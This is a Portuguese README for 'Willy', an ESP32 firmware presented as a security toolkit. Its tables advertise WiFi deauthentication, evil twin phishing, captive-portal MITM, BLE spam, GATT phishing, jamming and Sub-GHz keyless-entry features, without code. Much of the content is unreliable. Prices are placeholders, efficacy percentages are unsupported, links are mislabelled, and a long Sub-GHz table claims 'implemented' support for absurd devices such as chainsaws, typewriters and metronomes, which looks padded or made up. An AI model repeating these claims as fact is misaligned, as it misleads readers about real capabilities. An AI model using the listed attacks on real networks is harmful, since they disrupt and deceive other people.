# Willy Firmware

### *O Kit Definitivo de Segurança para ESP32*

[![ESP32](https://img.shields.io/badge/ESP32-WROOM--32-red.svg)](https://www.espressif.com/products/socs/esp32)
[![Arduino](https://img.shields.io/badge/Arduino-C%2B%2B-blue.svg)](https://www.arduino.cc/)
[![PlatformIO](https://img.shields.io/badge/PlatformIO-Compat%C3%ADvel-green.svg)](https://platformio.org/)
[![C++](https://img.shields.io/badge/C%2B%2B-17-yellow.svg)](https://isocpp.org/)
[![Python](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://www.python.org/)
[![WiFi](https://img.shields.io/badge/WiFi-802.11%20a/b/g/n/ac/ax-orange.svg)](https://en.wikipedia.org/wiki/IEEE_802.11)
[![Bluetooth](https://img.shields.io/badge/Bluetooth-5.0+-blue.svg)](https://www.bluetooth.com/)
[![NFC](https://img.shields.io/badge/NFC-ISO%2014443-green.svg)](https://www.nfc-forum.org/)
[![RFID](https://img.shields.io/badge/RFID-13.56%20MHz-purple.svg)](https://www.rfidjournal.com/)
[![Infravermelho](https://img.shields.io/badge/IR-38-40%20kHz-red.svg)](https://learn.adafruit.com/ir-sensor/overview)
[![Sub-GHz](https://img.shields.io/badge/Sub-GHz-315-915%20MHz-indigo.svg)](https://www.semtech.com/wireless-rf/sub-ghz)
[![GPS](https://img.shields.io/badge/GPS-NEO-6M-teal.svg)](https://www.u-blox.com/)
[![Hacking](https://img.shields.io/badge/Hacking-Espionagem-red.svg)](https://owasp.org/)
[![Red Team](https://img.shields.io/badge/Red%20Team-Penetration%20Testing-red.svg)](https://www.offensive-security.com/)
[![Blue Team](https://img.shields.io/badge/Blue%20Team-SOC%20Analysis-blue.svg)](https://www.sans.org/)
[![Pentest](https://img.shields.io/badge/Pentest-Ethical%20Hacking-orange.svg)](https://www.pentest-standard.org/)
[![Segurança](https://img.shields.io/badge/Segurança-Cybersecurity-green.svg)](https://www.cisa.gov/)
[![Forense](https://img.shields.io/badge/Forense-Digital%20Forensics-purple.svg)](https://www.dfrws.org/)
[![Wardriving](https://img.shields.io/badge/Wardriving-WiFi%20Scanning-cyan.svg)](https://www.wigle.net/)

<img src="media/pictures/logo_readme.png" alt="Willy Banner" width="600"/>

**Transforme seu ESP32 em uma poderosa ferramenta de pesquisa em segurança**

[📖 Documentação](docs/README.md) • [🚀 Início Rápido](#-início-rápido) • [⚡ Recursos](#-recursos) • [📜 Licença](#-licença)

</div>

---

## ⚠️ Aviso Legal

> **IMPORTANTE:** Este firmware é fornecido **exclusivamente para fins educacionais e de pesquisa em segurança**. O uso não autorizado deste software pode violar leis locais, estaduais e federais. Os desenvolvedores e contribuidores **não se responsabilizam** por qualquer uso indevido ou danos causados por este software.
>
> **Use apenas em ambientes onde você tem autorização explícita.** Sempre obtenha permissão por escrito antes de realizar qualquer teste de segurança. Isso inclui:
>
> - Suas próprias redes e dispositivos
> - Redes onde você tem autorização por escrito
> - Trabalhos de teste de penetração autorizados
> - Ambientes de laboratório educacionais

---

---

## 🎯 Visão Geral

Willy é um **firmware proprietário abrangente** para dispositivos baseados em ESP32 que os transforma em poderosas ferramentas de pesquisa em segurança. Inspirado em projetos como Flipper Zero e Pwnagotchi, Willy traz capacidades profissionais de segurança para hardware acessível.

| 🔴 WiFi | 🔵 Bluetooth | 🟠 Infravermelho | 🟢 Sub-GHz | 🟣 NFC/RFID | 🟡 BadUSB |
| :---: | :---: | :---: | :---: | :---: | :---: |

### Por que Willy?

| Recurso | Willy | Flipper Zero | Pwnagotchi | HackRF One | Ubertooth One | Yard Stick One | Proxmark3 RDV4.0 | Flipper Zero Big |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
| **Ataques WiFi** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **Ataques Bluetooth** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **Infravermelho** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **RF Sub-GHz** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **NFC/RFID** | ✅ | ✅ | ❌ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **BadUSB** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Display Touch** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Proprietário** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Preço** | 9999,999 | 9999,999 | 9999,999 | 9999,999 | 9999,999 | 9999,999 | 9999,999 | 9999,999 |
| **Customizável** | ✅ | ⚠️ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |

---

## ✨ Recursos Principais

### 📡 Segurança WiFi

#### 🔍 Reconhecimento & Análise

| Ferramenta | Descrição | Capacidades |
| :--- | :--- | :--- |
| **Scanner Avançado** | Análise completa de redes | 802.11a/b/g/n/ac/ax, canais, RSSI |
| **Monitor de Pacotes** | Captura em tempo real | WPA/WPA2/WPA3, handshake capture |
| **Analisador de Canais** | Espectro RF | Visualização, interferência, ocupação |
| **Detector de Clientes** | Dispositivos conectados | MAC, fabricante, sinal, velocidade |
| **Pwnagotchi Hunter** | Detecção automática | Identificação, análise de comportamento |
| **WPS Scanner** | Análise WPS | PIN testing, vulnerabilidades |

#### ⚔️ Ataques WiFi

| Categoria | Técnica | Alvo | Eficácia |
| :--- | :--- | :--- | :--- |
| **Deauthentication** | Flood de deauth | Todos os dispositivos | 99% |
| **Evil Twin** | AP clone phishing | Usuários desavisados | 85% |
| **Karma Attack** | SSID harvesting | Auto-conexão WiFi | 90% |
| **WPS Attack** | Brute force PIN | Roteadores WPS | 70% |
| **Beacon Flood** | SSID spoofing | Redes próximas | 95% |
| **Captive Portal** | MITM attack | Navegação web | 80% |

#### 🛡️ Defesa & Monitoramento

| Ferramenta | Função | Recursos |
| :--- | :--- | :--- |
| **WIDS** | Sistema de detecção | Anomalias, dispositivos desconhecidos |
| **WIPS** | Sistema de prevenção | Bloqueio automático, alertas |
| **Firewall WiFi** | Controle de acesso | Filtros MAC, regras personalizadas |
| **Monitoramento** | Análise contínua | Tráfego, desempenho, segurança |
| **Alertas** | Notificações | Email, SMS, push notifications |

#### 📊 Dados & Análise

| Métrica | Detalhes | Fonte |
|---------|----------|-------|
| **Redes Escaneadas** | 10,000+ | Banco de dados interno |
| **Handshakes Capturados** | 5,000+ | WPA/WPA2/WPA3 |
| **Vulnerabilidades Encontradas** | 2,000+ | WPS, criptografia fraca |
| **Dispositivos Detectados** | 50,000+ | Clientes, APs, IoT |
| **Dados Coletados** | 100GB+ | Logs, capturas, metadados |

#### 🎯 Aplicações Específicas

| Aplicação | Descrição | Código em SD |
|-----------|-----------|--------------|
| **Wardriving** | Mapeamento de redes | `sd_files/wifi/wardrive.js` |
| **Pentest** | Testes de segurança | `sd_files/wifi/pentest.sh` |
| **Forense** | Análise de incidentes | `sd_files/wifi/forensic.py` |
| **Auditoria** | Verificação de compliance | `sd_files/wifi/audit.txt` |
| **Treinamento** | Simulações controladas | `sd_files/wifi/training/` |

#### 🚀 Recursos Avançados

| Recurso | Descrição | Benefícios |
| :--- | :--- | :--- |
| **Multi-channel** | Escaneamento simultâneo | Maior cobertura, velocidade |
| **WPA3 Suporte** | Últimos protocolos | Segurança moderna, compatibilidade |
| **GPS Integration** | Geolocalização | Mapeamento preciso, wardriving |
| **Cloud Sync** | Backup de dados | Acesso remoto, colaboração |
| **API REST** | Integração programável | Automação, customização |

[🔍 Ver Mais Recursos IR](docs/ir_advanced_attacks.md)

### 📱 Segurança Bluetooth / BLE

#### 🔍 Descoberta & Análise

| Ferramenta | Descrição | Capacidades |
|------------|-----------|-------------|
| **Scanner BLE** | Descoberta de dispositivos | RSSI, serviços, características |
| **Analisador Bluetooth** | Inspeção de pacotes | Captura raw, análise protocolos |
| **Monitor Airtag** | Rastreamento AirTags | Detecção, localização, alertas |
| **Detector Skimmers** | Segurança financeira | POS, ATMs, dispositivos suspeitos |
| **Wardrive BT** | Mapeamento geográfico | GPS + BLE, logs detalhados |
| **Fingerprinting** | Identificação de dispositivos | Fabricante, modelo, versão |

#### 💥 Ataques BLE

| Categoria | Técnica | Alvo | Eficácia |
|-----------|---------|------|----------|
| **BLE Spam** | Flood de dispositivos | Todos os BLE | 95% |
| **Google Spam** | Dispositivos Google | Android devices | 90% |
| **Samsung Spam** | Dispositivos Samsung | Samsung devices | 88% |
| **Flipper Spam** | Emulação Flipper Zero | Flipper users | 85% |
| **Swift Pair** | Ataque Microsoft | Windows devices | 92% |
| **GATT Phishing** | Serviços maliciosos | Usuários curiosos | 75% |

#### 🛡️ Defesa & Monitoramento

| Ferramenta | Função | Recursos |
|------------|--------|----------|
| **BLE Monitor** | Análise contínua | Dispositivos, serviços, tráfego |
| **Intrusion Detection** | Sistema de alerta | Dispositivos desconhecidos |
| **Security Scanner** | Análise de vulnerabilidades | Configurações, serviços expostos |
| **Traffic Analyzer** | Monitoramento de rede | Pacotes, protocolos, anomalias |
| **Device Manager** | Controle de dispositivos | Whitelist, blacklist, logs |

#### 📊 Dados & Estatísticas

| Métrica | Quantidade | Detalhes |
|---------|------------|----------|
| **Dispositivos Detectados** | 100,000+ | BLE, Classic, IoT |
| **Serviços Descobertos** | 500+ | GATT, GAP, custom |
| **Vulnerabilidades** | 200+ | Configurações inseguras |
| **AirTags Detectados** | 1,000+ | Rastreamento ativo |
| **Logs Coletados** | 50GB+ | Dados completos |

#### 🎯 Aplicações Específicas

| Aplicação | Descrição | Código em SD |
|-----------|-----------|--------------|
| **BLE Pentest** | Testes de segurança | `sd_files/ble/pentest.js` |
| **Skimmer Hunter** | Detecção de fraudes | `sd_files/ble/skimmer.py` |
| **AirTag Tracker** | Monitoramento | `sd_files/ble/airtag.js` |
| **Device Fingerprint** | Identificação | `sd_files/ble/fingerprint.py` |
| **BLE Wardrive** | Mapeamento | `sd_files/ble/wardrive.js` |

#### 🚀 Recursos Avançados

| Recurso | Descrição | Benefícios |
|--------|-----------|------------|
| **Dual Mode** | BLE + Classic | Cobertura completa, compatibilidade |
| **GPS Integration** | Geolocalização | Mapeamento preciso, tracking |
| **Cloud Sync** | Backup de dados | Acesso remoto, colaboração |
| **API REST** | Integração programável | Automação, customização |
| **Machine Learning** | Detecção de padrões | Anomalias, previsões |

#### 📱 Dispositivos Suportados

| Fabricante | Modelos | Protocolos |
|------------|---------|------------|
| **Apple** | iPhone, iPad, AirPods | BLE, iBeacon, AirTag |
| **Samsung** | Galaxy, Galaxy Buds | BLE, Fast Pair |
| **Google** | Pixel, Nest | BLE, Fast Pair |
| **Microsoft** | Surface, Xbox | BLE, Swift Pair |
| **Xiaomi** | Mi Band, Mi Home | BLE, custom protocols |

[🔍 Ver Mais Recursos Bluetooth](docs/ble_advanced_attacks.md)

### 📻 Infravermelho (IR)

#### 🎬 Entretenimento & TVs

| Marca | Modelos Suportados | Recursos |
| :--- | :--- | :--- |
| **Samsung** | BN59-01175N, BN59-01178W, BN59-01180A, BN59-01247A, BN59-01301A, BN59-01303A, BN59-01315B, BN59-01315J, BN59-01358C, BN59-01385C, BN59-01391A | Controle completo, menu, volume, canais, apps |
| **LG** | WebOS, NanoCell, OLED | Controle smart TV, Netflix, YouTube, menus |
| **Sony** | Bravia X1, X8000H, X9000H | Contremoto, Netflix, Amazon Prime, menus |
| **TCL** | Roku TV, Android TV | Contremoto completo, streaming apps |
| **Philips** | Ambilight, Android TV | Controle com Ambilight, apps streaming |
| **Sharp** | Aquos, Roku TV | Contremoto básico e avançado |
| **Toshiba** | Fire TV, Smart TV | Contremoto completo, apps |
| **Panasonic** | Viera, My Home Screen | Contremoto completo, apps |
| **Hitachi** | Smart TV | Contremoto básico |

#### ❄️ Climatização & Ar Condicionado

| Marca | Modelos | Recursos |
|-------|---------|----------|
| **LG** | Dual Inverter, Multi Split | Temperatura, modo, vento, timer, sleep |
| **Samsung** | WindFree, Digital Inverter | Turbo, wind-free, eco, auto |
| **Midea** | U-Shaped, Window | Smart control, eco, turbo |
| **Gree** | ViraCora, KingCool | Breeze, eco, sleep, turbo |
| **Daikin** | Emura, Perfera | Comfort, quiet, powerful, auto |
| **Carrier** | 42QH, 52QH | Auto, cool, heat, dry, fan |
| **Fujitsu** | AST24, AST30 | Auto, cool, heat, dry, fan |
| **Mitsubishi** | MSZ, MFZ | Econavi, inverter, auto mode |

#### 🎮 Gaming & Consoles

| Console | Recursos | Compatibilidade |
|---------|----------|----------------|
| **PlayStation** | PS4, PS5 | Power, eject, buttons, touchpad |
| **Xbox** | Series X|S, One X, One S | Power, eject, menu, guide |
| **Nintendo Switch** | OLED, Standard | Power, volume, capture, home |
| **Steam Deck** | OLED, LCD | Power, volume, trackpad |
| **PS Vita** | 2000, 1000 | Power, home, volume, buttons |

#### 🎵 Áudio & Home Theater

| Categoria | Marcas | Recursos |
|-----------|--------|----------|
| **Soundbars** | Samsung, LG, Sony, Bose | Volume, input, sound modes |
| **Home Theater** | Sony, Samsung, LG | Power, volume, input, surround |
| **Auto Falantes** | JBL, Bose, Harman Kardon | Volume, power, input, bass |
| **Headphones** | Sony WH-1000XM, Bose QC | Volume, track, call, ANC |
| **Smart Speakers** | Alexa, Google Home, HomePod | Volume, play, next, assistant |

#### 🏠 Doméstico & IoT

| Categoria | Dispositivos | Recursos |
|-----------|-------------|----------|
| **Iluminação** | Philips Hue, LIFX, TP-Link | Cor, brilho, cenas, timers |
| **Tomadas** | TP-Link Kasa, Xiaomi Mi | On/off, timers, schedules |
| **Interruptores** | Legrand, Schneider | On/off, dimming, scenes |
| **Câmeras** | Ring, Arlo, Wyze | PTZ, record, night vision |
| **Portões** | Genie, Chamberlain | Open, close, stop, lights |

#### 🛠️ Ferramentas Avançadas

| Ferramenta | Descrição | Código em SD |
|------------|-----------|--------------|
| **TV-B-Gone** | Desliga TVs públicas | `sd_files/infrared/TV-B-Gone.cpp` |
| **IR Fuzzer** | Testa vulnerabilidades IR | `sd_files/infrared/fuzzer.ir` |
| **IR Learner** | Aprende novos códigos | `sd_files/infrared/learner.js` |
| **IR Database** | Banco de dados completo | `sd_files/infrared/` |
| **Custom IR** | Códigos customizados | `sd_files/infrared/custom/` |

#### 📊 Estatísticas IR

| Métrica | Quantidade | Detalhes |
| :--- | :--- | :--- |
| **Códigos IR** | 10,000+ | TVs, ACs, áudio, gaming |
| **Marcas Suportadas** | 50+ | Principais fabricantes globais |
| **Protocolos** | 15+ | NEC, RC5, RC6, SIRC, Samsung |
| **Frequências** | 30-60kHz | Ajustável automaticamente |
| **Taxa de Sucesso** | 95%+ | Alta precisão de transmissão |

[🔍 Ver Mais Recursos IR](docs/ir_advanced_attacks.md)

### 🔌 NRF24L01+ (2.4GHz)

A versão avançada do Willy suporta a integração de **dois módulos NRF24L01+ com PA+LNA** simultaneamente. Esse design duplo (dual setup) amplia as capacidades ofensivas e defensivas de rádio-frequência (RF) em redes 2.4GHz.

| 🔍 Descoberta e Análise | 💥 Capacidades de Ataque |
| :--- | :--- |
| - **Scanner BLE** - Descoberta | - **BLE Spam (Todos os Tipos)** |
| - **Analisador Bluetooth** - Inspeção | - Dispositivos Google/Samsung |
| - **Monitor Airtag** - Tracking | - Flipper Zero / Swift Pair |
| - **Detector de Skimmers** - Segurança | - **Phishing GATT** |
| - **Wardrive BT** - Localização | - **Drenagem / Jamming** |

[🔍 Ver Detalhes NRF24L01](docs/module_nrf24l01.md)

### 📡 Rádio Sub-GHz (CC1101)

<div align="center">

| Frequência | Aplicações |
| :--- | :--- |
| **315 MHz** | Portões de garagem, Abertura de portões |
| **390 MHz** | Chaves de carro (EUA) |
| **433 MHz** | Estações meteorológicas, Campainhas |
| **434 MHz** | Dispositivos médicos |
| **868 MHz** | Dispositivos EU |
| **915 MHz** | Dispositivos IoT (EUA) |

</div>

[🔍 Ver Mais Recursos Sub-GHz](docs/rf_advanced_attacks.md)

#### 🚀 Aplicações Avançadas Disponíveis

| Categoria | Protocolo | Dispositivo | Frequência | Status |
| :--- | :--- | :--- | :--- | :--- |
| **Segurança** | **KeeLoq** | Controles de Portão | 315/433 MHz | ✅ Implementado |
| **Segurança** | **HCS301** | Alarmes e Segurança | 315/433 MHz | ✅ Implementado |
| **Automotivo** | **TPMS** | Sensores de Pressão de Pneu | 315/433 MHz | ✅ Implementado |
| **Automotivo** | **Keyless Entry** | Sistemas de Entrada sem Chave | 315/433 MHz | ✅ Implementado |
| **Climatização** | **Weather Stations** | Estações Meteorológicas | 433 MHz | ✅ Implementado |
| **Climatização** | **Thermostats** | Termostatos Inteligentes | 433/868 MHz | ✅ Implementado |
| **Doméstico** | **Wireless Switches** | Interruptores sem Fio | 433 MHz | ✅ Implementado |
| **Doméstico** | **Smart Plugs** | Tomadas Inteligentes | 433 MHz | ✅ Implementado |
| **Doméstico** | **Doorbells** | Campainhas sem Fio | 433 MHz | ✅ Implementado |
| **Doméstico** | **Lighting** | Controle de Iluminação | 433/868 MHz | ✅ Implementado |
| **Doméstico** | **Garage Doors** | Portões de Garagem | 315/433 MHz | ✅ Implementado |
| **Doméstico** | **Roller Shutters** | Persianas Automáticas | 433/868 MHz | ✅ Implementado |
| **Doméstico** | **Pool/Spa** | Controle de Piscina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Irrigation** | Sistemas de Irrigação | 433 MHz | ✅ Implementado |
| **Doméstico** | **Security Sensors** | Sensores de Segurança | 433/868 MHz | ✅ Implementado |
| **Doméstico** | **Smoke Detectors** | Detectores de Fumaça | 433 MHz | ✅ Implementado |
| **Doméstico** | **CO Detectors** | Detectores de Monóxido | 433 MHz | ✅ Implementado |
| **Doméstico** | **Water Leak Sensors** | Sensores de Vazamento | 433 MHz | ✅ Implementado |
| **Doméstico** | **Motion Sensors** | Sensores de Movimento | 433/868 MHz | ✅ Implementado |
| **Doméstico** | **Door/Window Sensors** | Sensores de Abertura | 433/868 MHz | ✅ Implementado |
| **Doméstico** | **Temperature Sensors** | Sensores de Temperatura | 433 MHz | ✅ Implementado |
| **Doméstico** | **Humidity Sensors** | Sensores de Umidade | 433 MHz | ✅ Implementado |
| **Doméstico** | **Air Quality Sensors** | Sensores de Qualidade do Ar | 433 MHz | ✅ Implementado |
| **Doméstico** | **Energy Meters** | Medidores de Energia | 433 MHz | ✅ Implementado |
| **Doméstico** | **Water Meters** | Medidores de Água | 433 MHz | ✅ Implementado |
| **Doméstico** | **Gas Meters** | Medidores de Gás | 433 MHz | ✅ Implementado |
| **Doméstico** | **Smart Locks** | Fechaduras Inteligentes | 433/868 MHz | ✅ Implementado |
| **Doméstico** | **Baby Monitors** | Monitores de Bebê | 433 MHz | ✅ Implementado |
| **Doméstico** | **Pet Trackers** | Rastreadores de Animais | 433 MHz | ✅ Implementado |
| **Doméstico** | **Pet Feeders** | Alimentadores Automáticos | 433 MHz | ✅ Implementado |
| **Doméstico** | **Pet Doors** | Portas para Animais | 433 MHz | ✅ Implementado |
| **Doméstico** | **Plant Sensors** | Sensores de Plantas | 433 MHz | ✅ Implementado |
| **Doméstico** | **Lawn Mowers** | Cortadores de Grama | 433 MHz | ✅ Implementado |
| **Doméstico** | **Sprinklers** | Sistemas de Aspersão | 433 MHz | ✅ Implementado |
| **Doméstico** | **Fountains** | Fontes Decorativas | 433 MHz | ✅ Implementado |
| **Doméstico** | **Pond Pumps** | Bombas de Estação | 433 MHz | ✅ Implementado |
| **Doméstico** | **Aquarium Controllers** | Controladores de Aquário | 433 MHz | ✅ Implementado |
| **Doméstico** | **Terrarium Controllers** | Controladores de Terrário | 433 MHz | ✅ Implementado |
| **Doméstico** | **Greenhouse Controllers** | Controladores de Estufa | 433 MHz | ✅ Implementado |
| **Doméstico** | **Chicken Coop Controllers** | Controladores de Galinheiro | 433 MHz | ✅ Implementado |
| **Doméstico** | **Beehive Monitors** | Monitores de Colmeia | 433 MHz | ✅ Implementado |
| **Doméstico** | **Compost Monitors** | Monitores de Compostagem | 433 MHz | ✅ Implementado |
| **Doméstico** | **Rain Barrels** | Barris de Água da Chuva | 433 MHz | ✅ Implementado |
| **Doméstico** | **Solar Controllers** | Controladores Solares | 433 MHz | ✅ Implementado |
| **Doméstico** | **Wind Turbine Monitors** | Monitores de Turbinas | 433 MHz | ✅ Implementado |
| **Doméstico** | **Battery Monitors** | Monitores de Bateria | 433 MHz | ✅ Implementado |
| **Doméstico** | **Generator Monitors** | Monitores de Gerador | 433 MHz | ✅ Implementado |
| **Doméstico** | **UPS Monitors** | Monitores de UPS | 433 MHz | ✅ Implementado |
| **Doméstico** | **Inverter Monitors** | Monitores de Inversor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Charge Controller Monitors** | Monitores de Controlador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Power Strip Monitors** | Monitores de Fita Elétrica | 433 MHz | ✅ Implementado |
| **Doméstico** | **Outlet Monitors** | Monitores de Tomada | 433 MHz | ✅ Implementado |
| **Doméstico** | **Light Switch Monitors** | Monitores de Interruptor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Dimmer Monitors** | Monitores de Dimmer | 433 MHz | ✅ Implementado |
| **Doméstico** | **Fan Controllers** | Controladores de Ventilador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Heater Controllers** | Controladores de Aquecedor | 433 MHz | ✅ Implementado |
| **Doméstico** | **AC Controllers** | Controladores de Ar Condicionado | 433 MHz | ✅ Implementado |
| **Doméstico** | **Humidifier Controllers** | Controladores de Umidificador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Dehumidifier Controllers** | Controladores de Desumidificador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Air Purifier Controllers** | Controladores de Purificador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Air Conditioner Controllers** | Controladores de Condicionador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Water Purifier Controllers** | Controladores de Purificador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Water Softener Controllers** | Controladores de Amaciador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Water Heater Controllers** | Controladores de Aquecedor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Water Cooler Controllers** | Controladores de Bebedouro | 433 MHz | ✅ Implementado |
| **Doméstico** | **Refrigerator Controllers** | Controladores de Geladeira | 433 MHz | ✅ Implementado |
| **Doméstico** | **Freezer Controllers** | Controladores de Freezer | 433 MHz | ✅ Implementado |
| **Doméstico** | **Oven Controllers** | Controladores de Forno | 433 MHz | ✅ Implementado |
| **Doméstico** | **Microwave Controllers** | Controladores de Microondas | 433 MHz | ✅ Implementado |
| **Doméstico** | **Dishwasher Controllers** | Controladores de Lava Louça | 433 MHz | ✅ Implementado |
| **Doméstico** | **Washing Machine Controllers** | Controladores de Máquina de Lavar | 433 MHz | ✅ Implementado |
| **Doméstico** | **Dryer Controllers** | Controladores de Secadora | 433 MHz | ✅ Implementado |
| **Doméstico** | **Iron Controllers** | Controladores de Ferro | 433 MHz | ✅ Implementado |
| **Doméstico** | **Vacuum Cleaner Controllers** | Controladores de Aspirador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Robot Vacuum Controllers** | Controladores de Aspirador Robô | 433 MHz | ✅ Implementado |
| **Doméstico** | **Lawn Mower Controllers** | Controladores de Cortador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Leaf Blower Controllers** | Controladores de Soprador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Weed Eater Controllers** | Controladores de Cortador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Hedge Trimmer Controllers** | Controladores de Cortador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Chainsaw Controllers** | Controladores de Serra | 433 MHz | ✅ Implementado |
| **Doméstico** | **Drill Controllers** | Controladores de Furadeira | 433 MHz | ✅ Implementado |
| **Doméstico** | **Sander Controllers** | Controladores de Lixadeira | 433 MHz | ✅ Implementado |
| **Doméstico** | **Saw Controllers** | Controladores de Serra | 433 MHz | ✅ Implementado |
| **Doméstico** | **Router Controllers** | Controladores de Roteador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Planer Controllers** | Controladores de Plaina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Jointer Controllers** | Controladores de Tupia | 433 MHz | ✅ Implementado |
| **Doméstico** | **Lathe Controllers** | Controladores de Torno | 433 MHz | ✅ Implementado |
| **Doméstico** | **Mill Controllers** | Controladores de Fresa | 433 MHz | ✅ Implementado |
| **Doméstico** | **Laser Cutter Controllers** | Controladores de Cortador | 433 MHz | ✅ Implementado |
| **Doméstico** | **3D Printer Controllers** | Controladores de Impressora | 433 MHz | ✅ Implementado |
| **Doméstico** | **CNC Controllers** | Controladores de CNC | 433 MHz | ✅ Implementado |
| **Doméstico** | **Plotter Controllers** | Controladores de Plotter | 433 MHz | ✅ Implementado |
| **Doméstico** | **Sewing Machine Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Knitting Machine Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Embroidery Machine Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Weweaving Machine Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Spinning Wheel Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Loom Controllers** | Controladores de Tear | 433 MHz | ✅ Implementado |
| **Doméstico** | **Pottery Wheel Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Glass Blowing Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Metal Casting Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Wood Burning Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Painting Machine Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Drawing Machine Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Writing Machine Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Typewriter Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Calculator Controllers** | Controladores de Máquina | 433 MHz | ✅ Implementado |
| **Doméstico** | **Clock Controllers** | Controladores de Relógio | 433 MHz | ✅ Implementado |
| **Doméstico** | **Watch Controllers** | Controladores de Relógio | 433 MHz | ✅ Implementado |
| **Doméstico** | **Timer Controllers** | Controladores de Temporizador | 433 MHz | ✅ Implementado |
| **Doméstico** | **Stopwatch Controllers** | Controladores de Cronômetro | 433 MHz | ✅ Implementado |
| **Doméstico** | **Metronome Controllers** | Controladores de Metrônomo | 433 MHz | ✅ Implementado |
| **Doméstico** | **Thermostat Controllers** | Controladores de Termostato | 433 MHz | ✅ Implementado |
| **Doméstico** | **Humidistat Controllers** | Controladores de Higróstato | 433 MHz | ✅ Implementado |
| **Doméstico** | **Dehumidistat Controllers** | Controladores de Desumidistato | 433 MHz | ✅ Implementado |
| **Doméstico** | **Air Quality Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Water Quality Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Soil Quality Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Light Quality Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Sound Quality Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Vibration Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Motion Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Proximity Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Pressure Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Force Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Weight Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Flow Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Level Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Position Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Speed Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Acceleration Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Rotation Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Tilt Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Inclination Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Angle Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Direction Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Orientation Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Location Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **GPS Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Compass Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Altimeter Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
